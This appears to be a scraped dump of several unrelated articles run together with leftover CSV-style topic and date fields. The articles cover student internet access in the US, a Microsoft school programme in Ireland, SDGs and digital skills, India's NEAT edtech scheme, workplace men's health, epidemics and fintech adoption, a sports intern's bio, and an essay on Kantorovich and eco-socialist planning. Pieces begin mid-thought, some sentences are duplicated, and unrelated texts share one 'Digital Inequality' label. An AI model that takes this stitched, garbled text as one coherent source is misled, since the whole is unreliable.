But the data also makes clear that during the during the fall term, racial and economic inequality has remained significant, with African American and Hispanic households being 1.3 to 1.4 times as likely as white households to experience limited accessibility. Low-income households are most impacted by digital unavailability, with more than 2 in 5 having only limited access to a computer or the internet.

In addition, despite the drop between spring and fall, the rate of digital inaccessibility has begun to increase again since mid-October, slowly but unmistakably. The researchers are concerned that the divide may worsen amid the current surge in COVID-19 infections and resulting restrictions.

“This new research details a persistent and troubling digital divide among students, with far-reaching implications for educational access and equitable opportunities,” said Tina Christie, the Wasserman Dean of the UCLA School of Education and Information Studies, which co-published the report with the Center for Neighborhood Knowledge at the UCLA Luskin School of Public Affairs.

“The pandemic has brought into focus the intimate connection between education and technological connectivity and, with it, the connection between connectivity and social justice,” Christie said. “The battleground for educational equity has now, and perhaps forever, shifted into a new space.”

According to Ong, persistent digital inequality threatens to deepen disparities in achievement as minority and low-income children become adults, contributing to an intergenerational reproduction of inequality.

The project will also focus on upskilling 300 teachers with the digital skills required to introduce coding and computational design to the classroom.

The Microsoft Dream Space team will deliver hands-on sessions to students around Artificial Intelligence, design thinking and computational thinking.

Teachers will also have the opportunity to learn new teaching strategies focused on STEM and accessibility.

The team will deliver a STEM based module to a cohort of students within the School of Education in Maynooth University, designed to empower them as student teachers to deliver enhanced STEM based lessons whilst on placement in the participating Digital Wealth schools.

Some 45 schools across Ireland will participate in the programme over three years, 13 of which will be schools designated under the Delivering Equality of Opportunity in Schools (DEIS) initiative.

A needs analysis will take place in early 2022 to ensure schools receive the interventions they require, whether it be skills, hardware, or infrastructure, to support teachers in online learning and ensure that their students can engage fully in a digital world.

The collaboration will also see the roll-out of the STEM Passport for Inclusion project.

This new initiative will support 1,000 girls between fourth and sixth year from disadvantaged communities to progress into STEM courses and pursue a career in the digital economy.

The STEM Passport for Inclusion project was developed due to the low number of girls from disadvantaged backgrounds entering STEM related careers.

With the World Economic Forum estimating that 90% of all jobs in 2030 will require digital skills, and extensive research by the LSE and others indicating that girls from disadvantaged backgrounds are least likely to enter STEM careers, there is a clear need to ensure that every young person is given the opportunity to engage in STEM education and become a digital leader into the future.

James O'Connor, Vice President of Microsoft International Operations, said: ""Digital technology now plays a pivotal role in everyday teaching and learning, however, many school communities continue to lack the skills, infrastructure, and support to realise the benefits,"" he said.

""At Microsoft, we are committed to helping address the digital skills gaps and digital poverty inequalities that exist so that every young person has the opportunity to engage in STEM education and understand how technology can shape their world,"" he stated.

In both cases, AI algorithms were developed using data sets with an overrepresentation of light-skinned people.
Access to digital technologies also facilitates financial inclusion, mobile banking, microcredits, remittances, and increases market access14.","Developing the digital capabilities necessary to utilize technology meaningfully is essential for achieving the SDGs. SDG 1 aims to ensure that all men and women, particularly the poor and the vulnerable, have equal rights to economic resources that reduce poverty. In recent times we have seen that having the capacity to navigate the digital world has been central to maintaining employment, education, and connection4. Through COVID19, even the wealthiest countries have fallen short in ensuring that their citizens had the appropriate technologies and were skilled enough to maintain meaningful engagement in their everyday lives.

Just as fast as digital access and new and remarkable digital technologies have accelerated learning and knowledge for many, the lack of access, commodities, and capabilities leaves behind many more4. This is not only about access to technology but more fundamentally about people lacking the capabilities to use technology to engage in modern living. The emerging skills gap is evidence of this5 and the lack of integrated digital systems is burdening economies, widening the space between the rich and the poor, and preventing society from achieving SDG 1. Amartya Sen’s Human Capabilities Approach6 states that the human welfare derived from digital commodities depends not only on ownership and access but also on what can be done with such goods. In the context of ensuring we achieve all SDGs, having access to education (SDG 4), work (SDG 9), health (SDG 3), wealth (SDG 1), and security (SDG 16), requires society to provide both digital commodities and the digital capabilities needed to garner the benefit of the technological revolution.

SDG 9 focuses on building resilient infrastructures, promoting inclusive and sustainable industrialization, and fostering innovation. However, we are not equally empowered to engage in modern society in a way that supports innovation and growth. In less than 20 years, commercial internet has become a requirement for full participation in society, and the digital economy has become a digital ecosystem in itself. This ecosystem comprises multiple stakeholders, ranging from corporations to governments to NGOs and international organizations like the United Nations. As there is an increased dependence on the internet, companies create new services to meet these needs, like the Internet of Things, the Cloud, and machine-to-machine learning7, making accessible digital infrastructure critical for the achievement of SDG 9.

When considering who has meaningful access to emerging technologies and developing infrastructures, we begin to see a new face of inequality emerging. For example, technologies like AI and blockchain offer vast opportunities to reduce inequalities. One of the commonly known applications of blockchain is crypto-currency which has been successfully used as an alternative financial sector in emerging economies8. People experiencing health disparities have also benefited from it in terms of gaining safe access to health records, telehealth and reducing the spread of misinformation about medical treatments and vaccines9. However, technical know-how is necessary to garner the full benefit from blockchain.

In low or middle-income countries, there is limited access to digital infrastructures, which can reduce inequalities. Being absent from data sets that underpin developing technologies increases the risk of marginalization. This has been seen in AI programs that determine sentences for criminals, which are biased against African Americans10 or motion vision algorithms that do not work as effectively on darker-skinned people as lighter-skinned people11. In both cases, AI algorithms were developed using data sets with an overrepresentation of light-skinned people. As it currently stands, there is no SDG dedicated explicitly to digital systems; only four explicitly reference the impact that emerging Information Communication Technology (SDGs 4, 5, 9, 17) can have on inequality and the broader achievement of the SDGs12. The European Commission has highlighted this point, warning that while growth in AI, blockchain and digitalization has the potential to advance society, it also risks perpetuating historical inequalities in society, particularly where there are data gaps along the lines of class, gender, rac, or ethnic lines13.

Access to digital technologies also facilitates financial inclusion, mobile banking, microcredits, remittances, and increases market access14. These significantly contribute to alleviating poverty by highlighting the needs of vulnerable groups using real-time analytics and data. Simultaneously, digital systems allow vulnerable populations to partner with and co-create solutions with a wide range of stakeholders. Digital finance, e-commerce, and ethical e-governance innovations are increasing access to information and services. For example, China is seeing a decrease in the rural-urban divide due to using e-governance to increase access to health, education, and non-agricultural income-generating opportunities in rural areas12. In Bangladesh, iFarmer, a digital crowdfunding platform, gives rural women cattle farmers more access to markets by allowing investors to offer them capital12. Meanwhile, Rohingya refugees are creating livelihoods in Cox Bazaar using the e-commerce platform ekShop Shoron12.

While digital skills are named in SDG 4, as a target that seeks to increase the number of people with relevant skills for employment7. These indicators only focus on relevant skills, ignoring the commodities and infrastructures which impact their development and use. And reflection upon their growth is based solely on self-reported information of countries, with analysis showing perpetuation of inequalities through skewed data sets and reporting biases across gender groups, with women under and men overreporting15.",Digital Inequality,2021-11-03 07:00:00

After the government opened the registrations for students of these categories for free courses, nearly 37 lakh applications were received, Chandrashekhar said.
As the number of free coupons were limited, the authorities used an AI tool to pick students with caste, income, gender, age as filters.","A first-of-its-kind government scheme, set in motion over two years ago, has finally taken shape, bringing courses offered by a group of edtech platforms within the reach of college and university students from socio-economically disadvantaged backgrounds.

The scheme, guided by the public-private partnership model, was launched by the Ministry of Education in September 2019. While its success will be reviewed in the days to come, its intent places it among policy interventions that aims to address the question of digital inequality.

What is the scheme about?

The National Education Alliance for Technology (NEAT), which is being implemented by the All India Council for Technical Education (AICTE), aims to act as a bridge between edtech companies, academic institutions and students. The initiative was taken after a Ministry of Education review noted that learning tools developed by edtech platforms that can supplement classroom teaching need to be made more accessible. Accordingly, it was proposed that a portal be created where edtech platforms can be roped in to display their products after a shortlisting process.

What are the products on display in the portal?

The portal — neat.aicte-india.org– has separate sections listing products for students and educational institutes respectively. According to NEAT chief coordinating officer Budhha Chandrashekhar, so far the government has roped in 58 edtech companies. The companies were shortlisted by independent expert committees leaving no room for favouritism, he said.

Under the B2B (business to business) segment of the portal, courses are on offer for higher education institutes to purchase in bulk for their students. And the B2C (business to customer) section lists courses that eligible students can browse through and choose from. The courses range from accounting and finance to coding, including advanced programming languages like python.

How were students picked under the scheme?

There are two different ways through which students can enroll under the scheme. The basic objective of the scheme is to make students from disadvantaged backgrounds aware of the availability of such opportunities that can help them learn new skills or polish existing ones. In that regard, the AICTE reached out to higher education institutes across the country, directing them to inform students about the portal and enroll them based on their needs and consent. The edtech platforms have been allowed to charge fees as per their policies.

But then how will it benefit students from backward communities?

In order to do that, the government has mandated that every shortlisted company will have to offer free coupons to the extent of 25 per cent of the total registrations for their solution through NEAT portal. Through this route, the government created a bank of 12.15 lakh free coupons over the last two years. And it has now started distributing those coupons among students belonging to SC/ST/OBC and EWS categories with the annual family income cap fixed at Rs 8 lakh.

How were SC/ST/SC/EWS students chosen?

After the government opened the registrations for students of these categories for free courses, nearly 37 lakh applications were received, Chandrashekhar said. As the number of free coupons were limited, the authorities used an AI tool to pick students with caste, income, gender, age as filters. Older students and women have been given preference over men. A state-wise break up shows that of the total, 4.12 lakh free coupons are being distributed among students of Uttar Pradesh, followed by 2.23 lakh in Tamil Nadu, 1.38 lakh in Maharashtra and 1.21 lakh in Andhra Pradesh.

As working-age men are 32% less likely to visit a GP (compared to women), serious issues often go untreated for longer, sometimes until it is too late: one in five men do not reach traditional retirement age.

Although there are calls for a government-led Men’s Health Strategy to tackle this and other gender inequalities in healthcare, Peppy believes employers do not need to wait for this to make a difference to the holistic health of male employees and those who were assigned male at birth.

Not only is this important in supporting the specific clinical health of individual men within the workforce, but it is also important to support other areas of men’s health such as mental health, nutrition and exercise, enabling employers to retain healthy and productive employees and to avoid losing staff to competitors who are more forward-thinking in this area.

Peppy’s research corroborates these benefits. When asked about the importance of offering male-specific health support from a retention point of view:

half (50%) of employers said that offering men’s health support is important to mitigate the risk of the wider workforce being impacted by the few, i.e. a team being affected by a colleague having time off or not being productive.

thirty-seven per cent said offering men’s health support is important to reduce staff churn.

The consultation deficit

In September 2021, the ONS reported the first decline in male life expectancy since the 1980s4 with suicide, health disease, cancer and diabetes being among the biggest culprits of premature death. Many of these deaths could have been prevented if men were more engaged with their health and wellbeing.

The primary reason often cited for the male ‘consultation deficit’, is traditional masculine behaviours where men delay consultations with healthcare professionals, often resulting in poorer health outcomes. Similarly, significant events across the female lifespan including menstruation, contraception, pregnancy and menopause mean that women are compelled to be more in contact with primary care services – unlike men.

Helen Lake, Director of Men’s Health, at Peppy said: “We would, of course, welcome a Men’s Health Strategy but in the meantime, employers do not need to live with the status quo. Resources are available for employers to improve the holistic health of the men within their organisations right now. We know that a gender-focussed approach is necessary and it’s not overstating things to say lives could be saved if employers step up to help men engage more in their own physical, mental and nutritional health and wellbeing.”

Dedicated support is required

Peppy believes that offering wide-reaching workplace health support that is aimed at men is a huge differentiator in terms of take-up, as male employees and those who were assigned male at birth, know that they will receive dedicated support. This applies to male-specific conditions such as prostate and testicular cancer but also to nutrition, fitness and mental health support, which requires a different approach and accessibility.

Why workplace solutions work

Discreet, holistic health support provided via the workplace is particularly good for men as it makes getting help more accessible and less of a significant undertaking for the individual.

Employers looking to offer men’s health support in the workplace need to consider the best method of delivery. Digital solutions, in particular, are often more inclusive and convenient, enabling men to have conversations discreetly, and often anonymously, which is often preferred, particularly initially. However, having the opportunity for human interaction can become more important, particularly if a diagnosis has been received. The best men’s health support will not just deliver support from one practitioner, it will be a whole team of experts who work together to get to the root of issues.

In fact, employers themselves believe that the ability to have one-to-one support from specialist clinicians is the most crucial factor in providing men’s health support (43%). However, acknowledging the male psyche and the need for privacy, employers believe that signposting to trusted educational materials, reading and websites are the next most important (39%)1.

Helen Lake concluded: “Men are more likely to bury their head in the sand when it comes to their health and wellbeing, so generic health messages can get ignored or overlooked. By supporting men’s health with dedicated and accessible support, employers are better able to raise awareness of specific illnesses such as male-specific cancers, heart disease or diabetes, as well as other more general health concerns including diet and exercise.

“Employers who support their male employees with a gender-focussed approach, increase the chance of their staff getting better outcomes and having a happier, healthier workforce.”",Digital Inequality,2022-06-11 08:00:01

Orkun Saka, Barry Eichengreen, Cevat Giray Aksoy

Although epidemics are frequently cited as inducing changes in economic behaviour and accelerating technological and behavioural trends, there may be important differences across socioeconomic groups in ability to utilise such new technologies. This column studies these issues in the context of fintech adoption and finds strong evidence of epidemic-induced changes in economic and financial behaviour, of differences in the extent of such shifts by more and less economically advantaged individuals, and of a role for IT infrastructure in spreading or limiting the benefits of technological alternatives. The results highlight both the behavioural response to epidemics and the digital divide.

Epidemics are frequently cited as inducing changes in economic behaviour and accelerating technological and behavioural trends. The Black Death, the mother of all epidemics, is thought to have sped up the adoption of earlier capital-intensive agricultural technologies such as the heavy plough and water mill by inducing substitution of capital for more expensive labour. COVID-19, to take a rather more recent example, is said to have increased remote working, online shopping, and telehealth.

But there may be important differences across socioeconomic groups in ability to utilise such new technologies. High-tech workers and workers in the professions have been better able to shift to remote work compared to store clerks, custodians and other less well-paid individuals (Saad and Jones 2021). Women have had more difficulty than men capitalising on opportunities to work remotely, given the occupations in which they are specialised (Coury et al. 2020). Individuals older than 65, being less technologically adaptable, find it more difficult to adjust to new work modalities (Farrell 2020). Small firms with limited technological capabilities have been less able to adapt their business models and stay competitive than their larger rivals, while residents of areas with limited broadband have experienced less scope for moving to remote work, remote schooling, and telehealth (Chiou and Tucker 2020). COVID-19, it is said, has accelerated ongoing trends. If the increasing prevalence of the so-called digital divide was an ongoing trend before COVID, then the pandemic may have accelerated this one in particular.

The case of fintech

In a recent paper (Saka et al. 2021), we study these issues in the context of fintech adoption. Specifically, we ask whether past epidemics induced a shift towards new financial technologies such as online banking and away from traditional brick-and-mortar bank branches. Online and mobile banking is a particularly informative context for studying the broader question of whether past epidemics induced the adoption of new technologies and, if so, by whom and where. Individuals have been using their computers and smartphones for banking applications for years. People in a variety of different countries and settings have available banking options that involve both in-person contact (such as banking via tellers in bank branches of a sort that may be problematic during an epidemic) and digital alternatives (such as banking via the internet or mobile phone app); these alternatives have been available for some time.

In contrast, analogous studies of telehealth would face the obstacle that physicians’ offices in many countries and settings did not, at the time of epidemic exposure, possess the capacity to provide such services remotely. Similarly, studies of remote schooling in the context of past epidemics would be limited by the fact that few schools and homes had available a flexible video conferencing technology such as Zoom, much less the reliable internet needed to operate it.

Main findings

We combine data on epidemics worldwide with nationally representative Global Findex surveys of individual financial behaviour fielded in more than 140 countries in 2011, 2014, and 2017. The novelty comes from our ability to match each individual in Global Findex dataset to detailed background information about the same individual in Gallup World Polls. This allows us to control for socioeconomic factors at the most granular level possible.

Figure 1 The impact of an epidemic on financial technology adoption

Notes: Results use the Findex-Gallup sampling weights and robust standard errors are clustered at the country level. Estimates are reported with 95% confidence intervals.

Source: Saka et al. (2021).

Holding constant individual-level economic and demographic characteristics and country and year fixed effects, we find that contemporaneous epidemic exposure significantly increases the likelihood that individuals transact via the internet and mobile bank accounts, make online payments using the internet, and complete account transactions using an ATM instead of a bank branch. Separate impacts on ATM and in-branch transactions almost exactly offset (see Figure 1). This suggests that epidemic exposure mainly affects the form of banking activity – digital or in person – without also increasing or reducing its volume or extent. While the limited time span covered by our data allows for only a tentative analysis of persistence, our results suggest that the impact of epidemic exposure is felt mainly in the short run rather than enduringly over time.

Using the machine learning algorithm suggested by Athey and Imbens (2016), we then go on to identify the critical dimensions in the heterogeneity of our treatment effects. These turn out to be individual income, employment and age. It is mainly the young, high-income earners in full-time employment who take up online/mobile transactions in response to epidemics, in other words. These patterns are consistent with previous research on early adopters of other digital technologies (Chau and Hui 1998, Dedehayir et al 2017).

The role of the digital divide

We further highlight the importance of the digital divide by investigating the role of local internet infrastructure in conditioning the shift toward online banking. We match 1km-by-1km time-varying data on global 3G internet coverage from Collins Bartholomew’s Mobile Coverage Explorer to the sub-national region in which each individual is located. These data are shown in Figure 2.

We find that individuals with better ex ante internet coverage are more likely to shift towards online banking in response to an epidemic. This finding still obtains when we employ a specification with country-by-year fixed effects that absorb all types of country-level variation in our sample, including the incidence of epidemics. Importantly, we fail to find any consistent effect for 2G coverage when this variable is included in the estimation side by side with our 3G measure, confirming our intuition that the relevant technology for the epidemic response is related to the internet and not to the overall mobile phone usage.

Conclusion

In sum, we find strong evidence of epidemic-induced changes in economic and financial behaviour, of differences in the extent of such shifts by more and less economically advantaged individuals, and of a role for IT infrastructure in spreading or limiting the benefits of technological alternatives. The results thus highlight both the behavioural response to epidemics and the digital divide.

The COVID-19 pandemic accelerated the adoption of technology in education.

In a 2019 Gallup survey, an overwhelming majority of teachers (85%), principals (96%), and administrators (96%) favored increased use of digital learning tools. Nearly half of teachers reported assigning technology-based homework at least sometimes. Nationwide, 20% of K–12 districts have adopted or are considering post-pandemic virtual schooling, and another 10% anticipate continued use of hybrid models. Distance learning is even more popular in higher education. In fall 2018, nearly 6 million undergraduates nationwide (or 35%) enrolled in distance courses, up from 4.6 million in 2013. It is likely that the pandemic accelerated this trend.

It is likely that the pandemic accelerated this trend. COVID-19 also highlighted the digital divide and other inequities.

The pandemic highlighted long-standing digital gaps that have affected African American, Latino, and low-income students. In 2019, 13% of K–12 students and college students did not have broadband at home. College students in rural (22%), low-income (21%), and Latino (16%) households were particularly likely to lack home broadband. Almost 10% of K–12 teachers lacked access to home broadband. At the onset of the pandemic, only 67% of K–12 students had reliable access to computing devices; access levels were particularly low among low-income (52%), Black (58%), and Latino (61%) students. As schools shifted online, the digital divide may have worsened other inequities: many students—particularly English Learners and those with disabilities—rely on schools for occupational therapy, academic and social support, mental health care, and other services.

Broadband access varies among college students SOURCE: American Community Survey 2019. NOTES: Low-income households have income less than $50,000 and high-income households have income above $100,000.

Distance learning has been challenging—especially for K–12 schools.

The closure of public schools and colleges in March 2020 created unprecedented demand for broadband and device access—particularly for K–12 schools, many of which were new to distance learning. The average size of households with school-age children is four; multiple users need additional bandwidth for reliable access. More than a quarter of K–12 students (29%) lacked reliable internet access in spring 2020, and the PPIC Statewide Survey found that half of California parents had concerns about providing productive learning environments.

More than a quarter of K–12 students (29%) lacked reliable internet access in spring 2020, and the PPIC Statewide Survey found that half of California parents had concerns about providing productive learning environments. Policymakers and educators scrambled to bridge the digital divide during the pandemic.

California’s K–12 schools and colleges received more than $6 billion via the federal CARES Act and used some for technology. The California Department of Education established public-private partnerships to secure devices for students, and districts across the state outfitted school busses with Wi-Fi, partnered with internet service providers, or built cellular towers. The higher education system, including the University of California, California State University, and California Community Colleges, provided students with digital equipment and services. The December 2020 federal relief package included $7.8 billion for California’s K–12 schools and community colleges, which can be used for technology.

Many K–12 students have gained access to devices—but internet access remains a problem.

Federal, state, and local investments have expanded access to devices among K–12 students. By fall 2020, 79% had access to devices, and access levels were significantly higher among low-income (72%), African American (83%), and Latino (73%) students. However, internet access remains uneven: nearly 40% of low-income K–12 students lack reliable internet at home, and students in rural areas are especially likely to lack reliable internet.

Internet access gaps persisted in fall 2020 SOURCE: Household PULSE Survey, Census, 2020. NOTES: Low-income households have income less than $50,000 and high-income households have income above $100,000. **: p < 0.05.

The federal government may play a key role in closing the digital divide.

The Federal Communications Commission recently allocated $9.2 billion for the construction of rural broadband networks over the next decade; California received $695 million. President Biden’s recovery plan includes universal broadband and infrastructure modernization, and the most recent federal relief package set aside $7 billion for broadband and infrastructure. In 2020, Governor Newsom issued an executive order requiring state agencies to address the digital divide, and the state released a Broadband for All Action Plan. This should help California make the most of federal support. Federal and state coordination is key.",Digital Inequality,2021-02-12 21:09:10

Sports

Our new sports intern writes: “While I am currently in Chicago, studying journalism at Northwestern University, I was born and raised in the East Bay. I have always been a fan of Bay Area sports; although I haven’t been to a Warriors game since Steph Curry joined the roster. Remember when tickets were only $26?

“I spent the past three months working remotely with the CNN Sports team, assisting the desk with newsgathering and writing digital articles. At CNN, I had the opportunity to gain experience reporting on some of the biggest events in sports, including the Winter Olympics, March Madness, the Masters and the NFL Draft. At Northwestern, I work with the athletic communications department as an assistant. I write game stories and features for NUSports.com, with a focus on field hockey, women's basketball and women's lacrosse. I also handle social media for the same sports, so I got to live-tweet Northwestern field hockey's win in the 2021 NCAA Championship game!

“I'm super excited to be back in the Bay Area for the summer after suffering through yet another Chicago winter and even more thrilled to be working with reporters I read all the time!”

For Leonid Kantorovich, mathematics was a matter of life and death. The year was 1941, and German and Finnish armies had besieged Kantorovich’s hometown of Leningrad during Operation Barbarossa, severing the city’s inbound roads and railways to starve it into submission. But a single thread tied the city to the outside world: over Lake Ladoga on the city’s eastern flank.

Soviet barges could ferry supplies in the summer, but in the winter sleds and trucks had to make the perilous journey on ice. This “road of life” was the only way to keep millions of trapped civilians and soldiers in Leningrad alive and fighting. It was a treacherous and deadly road — some 40 trucks fell through the ice during the first week of the winter convoy. With the threat of the Luftwaffe overhead, Kantorovich’s job was to minimize these losses. If he failed, the city would not hold out for long.

The lake presented an urgent mathematical problem: Given the wind, temperature and thickness of the ice, how many trucks could be sent over, and how heavy could they be? Rapid changes in weather conditions and the threat of German planes made the puzzle even more difficult.

Despite the danger, the young professor insisted on being on the ice himself to see the convoys through these challenges. Kantorovich’s efforts brought thousands of tons of fuel, food and munitions into the city, and nearly 1.5 million civilians out of it. Adolf Hitler thought he could conquer Leningrad in six weeks; nearly 900 days later, the siege was lifted, and the humbled Wehrmacht retreated westwards.

When he was not busy calculating the margins of life and death at Lake Ladoga, Kantorovich was hard at work on his masterpiece, “The Best Use of Economic Resources.” While his early mathematical work had been in the abstract fields of analysis and topology, this book was as practical as the road of life.

“Just as he had optimized the convoys across the icy lake, the young mathematician sought to optimize socialism itself.”

Kantorovich’s study delineated how “mathematical methods” could be applied to the “whole economy” on a “scientifically planned basis.” While he stressed that a capitalist economy could never approach such a degree of rationality, he politely recognized that “planning deficiencies exist as a direct result of economic science lagging behind the requirements needed in the building up of a communist state.”

The “Best Use of Economic Resources” was an attempt to provide an economic science commensurate with the utopian ambitions of the Soviet Union. In place of the self-interested and often inefficient decisions made by the central planning bureau, Gosplan, Kantorovich imagined that algorithmic planning could increase efficiency at every scale, from factory to nation. Just as he had optimized the convoys across the icy lake, the young mathematician sought to optimize socialism itself.

Kantorovich’s pathbreaking work on mathematical solutions to complex economic production questions had begun at a plywood factory three years earlier. The factory’s engineers asked Kantorovich to help them figure out the best way to use their lathes, saws and other machinery — all of which operated at different rates — in order to maximize output of a mix of plywood.

The problem sounded easy enough, but Kantorovich quickly found solving it classically would require over a million equations. So he developed an algorithm he called “linear programming” and devised a solution in an afternoon using only pen and paper. What’s more, the algorithm could be universally applied to any situation where a particular value subject to linear constraints had to be maximized or minimized (designing a train schedule that minimizes passenger travel time, for example).

Linear programming was not only a quintessentially socialist kind of mathematics because it was “characterized by a constant overlap of theory and practice,” but it also offered a way to make a socialist political economy more efficient and rational. Kantorovich immediately began to imagine how his method could be scaled up from the factory to the nation, even the world.

Kantorovich seemed unaware of the work of an earlier socialist economist, the remarkable but largely forgotten polymath of early 20th-century Vienna, Otto Neurath. The kernel of Neurath’s philosophical system was the rejection of “pseudorationality” — the belief that any single metric, like money, could guide all decisions within any system, economic or otherwise.

Capitalism is an inherently irrational system because the pursuit of profit to the exclusion of all other considerations leads to disaster, such as the climate crisis and the sixth mass extinction. Notably, Neurath extended this insight to socialist economics and argued that an alternative system based on a universal equivalent (labor time, for example) would also lack the necessary conscious control that could rationally and democratically weigh tradeoffs between the incommensurate ethical, social, environmental and aesthetic considerations that comprise any decision. Neurath reasoned that socialism could not be based on market mechanisms, so he criticized the desire of fellow socialists to maintain the “uncontrollable monetary order and at the same time to want to socialize” as “an inner contradiction.”

Neurath came to these conclusions by studying ancient and contemporary examples of economies based on “natural” (or “in natura”) units of discrete physical things, rather than money. In 1906, he finished his doctoral dissertation on the non-monetary economy of ancient Egypt. He was convinced that money did not necessarily represent an advance in economic history, as “the large store-keeping economy of the ancient Egyptian kings and princes, with their accounting facilities, their wages in kind and other institutions was on a much higher level than the Greek money economy of the fourth century [BCE].”

“Capitalism is an inherently irrational system because the pursuit of profit to the exclusion of all other considerations leads to disaster, such as the climate crisis and the sixth mass extinction.”

Neurath employed his insights from ancient Egyptian economics to study war economics during the Balkan Wars (1912-13) and World War I. He came to see in natura calculation as the solution to the problem of pseudorationality. After all, he argued, there were no “war units” to guide a battleship commander’s decisions. What mattered were incommensurate things: “the course of the ship, the power of the engines, the range of the guns, the stores of ammunition, the torpedoes and the food supplies.” In an emergency, prices fail to convey any information at all.

Twenty years later after Neurath theorized the possibilities of in natura socialism, Kantorovich’s linear programming offered what was perhaps the first practical method to actually implement it. Rather than reducing everything to a universal equivalent (like price), Kantorovich could balance competing restrictions in their natural units — tons of steel or watts of electricity — across many different projects simultaneously.

While not sufficient to organize something as complex as an economy, linear programming marked a conceptual breakthrough in planning theory. It offered a systematic way to allocate resources and thus optimize selected metrics of national well-being. That is, as soon as a planner could articulate the material constraints of an economy using mathematical language, plans of production and distribution could naturally follow without the aid of the market’s invisible hand. Even with the primitive computers available in the 1940s, Kantorovich could dream of “programming the USSR.”

In many ways, Kantorovich embodied the optimism of the “thaw” period after Stalin when rapid economic growth, the new universal science of “cybernetics” and the space age seemed to herald the coming of an abundant and humane socialism. Yet, despite these promising conditions, linear programming failed for two reasons: After the Prague Spring of 1968, anything that smacked of “market socialism” (a tradition that Kantorovich only tangentially belonged to) was compromised, leaving reformers little chance of revitalizing the USSR’s increasingly decrepit planning apparatus. And second, the lack of democracy in the Soviet Union meant that it was impossible to assemble a new political coalition strong enough to overcome the vested interests of economic planners and managers, who enforced the Communist Party’s five-year plans.

Optimizing the whole economy would rob this elite of their power over the distribution of resources. Reformers were allowed to optimize individual factories or even industries, but never the economy as a whole. Even a highly decorated technocrat like Kantorovich could not realize the dream of an efficient, moneyless, socialist economy because no social movement existed that could help him overcome elite opposition.

Neurath made clear that conscious control is a planned economy’s greatest strength compared to capitalism, but it requires democracy to prevent authoritarian and inefficient supervision over the production and distribution of goods. In this way, we could say that linear programming remained a doomed demi-utopian proposal as long as it was not integrated within a broader liberatory project.

Democracy has become only more necessary in the globalized world that socialism will inherit, in which different locations will have specialized roles in the economy and will require supplies produced in faraway regions. Planning will require extraordinary efforts to ensure that no one is excluded or exploited in a global network of interdependence.

“Today, capitalism has never offered a bleaker future, while socialism has never been more feasible and necessary.”

As Kantorovich understood it, the goal is not to micromanage every pound of coffee or piece of steel rebar around the globe, but to “construct a system of information, accounting, economic indices and stimuli which permit local decision-making organs to evaluate the advantage of their decisions from the point of view of the whole economy.” Thus, it is necessary to marry Kantorovich’s technical vision to Neurath’s “scientific utopianism,” in which planners lay out their goals and constraints in natural units and then devise different plans that could be chosen by an informed public.

Today, one could imagine that these plans would represent many possible futures for a socialist planet — one might involve geoengineering and the conveniences of fossil fuels, while another could abolish the use of hydrocarbons entirely. The costs of each of these possible futures can be estimated in natural units, making clear the difficult trade-offs that must be made. Parliamentary representatives could decide on a plan, or perhaps the choice could be put directly to the people in a referendum. Neurath called these various imagined futures “scientific utopias,” and saw them as foundational to economic democracy.

Creating plans based on in natura calculation and putting them to a vote would demystify the economy, making it more difficult for a selfish bureaucratic caste to obscure and thus control its workings. Although the methods required to coordinate today’s economy would be considerably more complex than the linear programming Kantorovich originally employed, the need for democracy is no less pressing.

Today, capitalism has never offered a bleaker future, while socialism has never been more feasible and necessary. Yet, even a wisely managed eco-socialist utopia would still be plagued by some inefficiencies and shortages. However, we believe it is worth paying to gain other advantages, such as a stable climate, wondrous biodiversity and respite from pandemics. Such a society, what we call “Half-Earth socialism,” also promises the prospect of a global polity predicated on care, equality and unalienated labor. Our proposal is only one of many ways that humanity could navigate the environmental crisis, and, in the spirit of Neurath’s democratic vision, we invite others to contribute their own scientific utopias.

Creating a just world that fits within ecological constraints is the road of life that humanity must cross in the 21st century. During the siege of Leningrad, Kantorovich understood that trucks would crash through the ice if they were loaded too heavily, but if they were loaded too lightly, people would starve unnecessarily. Half-Earth socialism requires a similar balancing act, supplying everyone with the material foundations for a good life — sustenance, shelter, education, art, health — while protecting the biosphere from destabilization.

In the scientific literature, this challenge is known as the “planetary boundaries” debate, in which scientists calculate how to provide for everyone’s basic needs without trashing the planet. Such a research program, however, is incomplete if it fails to recognize the impossibility of reaching these goals within capitalism. The need to plan and constrain humanity’s interchange with nature conflicts with the unconscious, expansive force of capital.

Although there are many estimates of planetary limits, even the most advanced models are unable to help one imagine post-capitalist ecological stability. This is not for a lack of technical know-how. Systems engineers at key institutions have built massive supercomputer programs called Integrated Assessment Models (IAMs) that combine physics, chemistry, biology and economics into a single simulation of the world for the next 300 or so years. IAMs are central to climate politics; anytime you hear a prediction about climate projections for 2100, an engineer with an IAM has probably been tinkering behind the scenes with variables such as pollution taxes, probabilities of technological breakthroughs, spatial patterns of agriculture and biofuels, global food demand, the makeup of energy systems and the sensitivity of the climate and biosphere to all these social changes.

IAMs are powerful tools, but they also demonstrate the problem of Neurathian pseudorationality. For instance, bioenergy with carbon capture and storage (BECCS) is favored by IAM modelers not because it is an effective or realistic solution to climate change, but because IAMs rely on the universal equivalent of money (even transforming CO2 into cash via a carbon tax), and BECCS is a useful way to transform dollars into negative emissions within a model. Give a BECCS plantation x dollars a year from a carbon tax and you will sequester y kilograms of carbon from the atmosphere.

Research into ‘planetary boundaries,’ in which scientists calculate how to provide for everyone’s basic needs without trashing the planet, is incomplete if it fails to recognize the impossibility of reaching these goals within capitalism.

Pseudorationality has now given the illusion that climate change can be reduced to a simple algebra problem. Clearly, another kind of political economy — eco-socialism — is needed. This method should allow us to think in terms of trade-offs between discrete and incommensurate goals, much like Kantorovich’s calculations on Lake Ladoga, without money or other universal equivalents distorting global plans.

This is not to say that the modelers are clueless — indeed, many systems engineers understand that an enormous revolution in energy systems, drastic cuts to individual consumption and radical resource redistribution from the global north to south are required to create a just society with a stable biosphere.

Yet, like the scientists who research planetary boundaries, too many modelers lack a political program that is able to realize the transformation they dream about. Their position is like Kantorovich’s at the height of his influence in the 1960s — prestige and knowledge cannot change the world when stymied by powerful vested interests.

Science combined with a large social movement can be a powerful force, such as the anti-nuclear movement during the Cold War. Nothing scares neoliberals more than radical science allied with social movements, but until such a union arises, they have little to fear. Without a drastic political rupture, modelers will continue to be forced to rely on ever more unlikely deus ex machina, such as BECCS and solar geoengineering. Although critics of the left often accuse socialists of magical thinking, the real fantasy is a future where capitalism is constrained within planetary boundaries.

